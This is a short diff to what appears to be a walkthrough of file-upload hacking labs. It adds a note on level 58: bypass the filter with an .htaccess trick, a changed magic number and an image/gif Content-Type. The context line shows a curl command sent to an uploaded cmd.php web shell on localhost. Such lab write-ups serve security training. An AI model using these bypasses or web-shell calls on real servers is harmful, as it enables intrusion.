@@ -354,7 +354,11 @@ curl -s -X GET "http://localhost:9001/upload56/pepe/cmd.php" -G --data-urlencode
 
 ---
 
+# Upload 58
 
+This work with the trick of **.htaccess** see in **upload 12**, but in this case you have to change the magic number and the Content-Type:image/gif
+
+This is like a mix of some uploads labs
 
 ---
 
